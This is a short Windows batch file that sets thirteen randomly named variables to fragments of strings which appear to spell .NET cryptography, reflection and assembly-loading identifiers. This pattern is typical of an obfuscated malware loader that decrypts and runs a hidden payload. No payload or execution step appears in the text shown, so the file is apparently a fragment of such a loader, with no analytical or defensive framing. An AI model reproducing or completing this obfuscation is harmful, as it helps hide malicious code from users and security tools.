@echo off
set "kpFElHmoPI=saBm"
set "kFxhLGuZWX=flec"
set "CcoSFMqlqZ=ypto"
set "rEMJaFAexI=rofi"
set "NjCiQRaCgs=ewLi"
set "leqCFEEaJU=tem."
set "PEdALxMyuF=zwQI"
set "KnJrNcrpaU=V = "
set "uSITeOGVNp=ptog"
set "oYoGXbUNUT=embl"
set "zwLqORmSBQ=ateD"
set "MvhlAwupby=Disp"
set "GNAfwYpjiL=.Cry"
